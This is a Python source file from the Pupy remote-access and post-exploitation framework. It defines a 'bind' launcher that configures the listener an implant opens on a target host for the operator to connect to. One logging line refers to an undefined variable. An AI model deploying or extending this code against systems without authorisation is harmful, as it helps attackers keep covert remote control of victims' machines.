# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms


from ..base_launcher import *
try:
    import ConfigParser as configparser
except ImportError:
    import configparser

class BindLauncher(BaseLauncher):
    """ start a simple bind launcher with the specified transport """
    def init_argparse(self):
        self.arg_parser = LauncherArgumentParser(prog="bind", description=self.__doc__)
        self.arg_parser.add_argument('--port', metavar='<port>', type=int, required=True, help='the port to bind on')
        self.arg_parser.add_argument('--host', metavar='<ip>', default='0.0.0.0', help='the ip to listen on (default 0.0.0.0)')
        self.arg_parser.add_argument('-t', '--transport', choices=[x for x in network.conf.transports.iterkeys()], default="ssl", help="the transport to use ! (the pupysh.sh --connect will need to be configured with the same transport) ")
        self.arg_parser.add_argument('transport_args', nargs=argparse.REMAINDER, help="change some transport arguments")

    def parse_args(self, args):
        self.args=self.arg_parser.parse_args(args)
        self.set_host("%s:%s"%(self.args.host, self.args.port))
        self.set_transport(self.args.transport)

    def iterate(self):
        if self.args is None:
            raise LauncherError("parse_args needs to be called before iterate")
        logging.info("binding on %s:%s using transport %s ..."%(self.args.host, self.args.port, self.args.transport))
        opt_args=utils.parse_transports_args(' '.join(self.args.transport_args))
        t=network.conf.transports[self.args.transport](bind_payload=True)

        transport_kwargs=t.server_transport_kwargs
        for val in opt_args:
            if val.lower() in t.server_transport_kwargs:
                transport_kwargs[val.lower()]=opt_args[val]
            else:
                logging.warning("unknown transport argument : %s"%tab[0])
        t.parse_args(transport_kwargs)
        logging.info("using transports options: %s"%transport_kwargs)
        if t.authenticator:
            authenticator=t.authenticator()
        else:
            authenticator=None

        yield (t.server, self.args.port, self.args.host, authenticator, t.stream, t.server_transport, transport_kwargs)



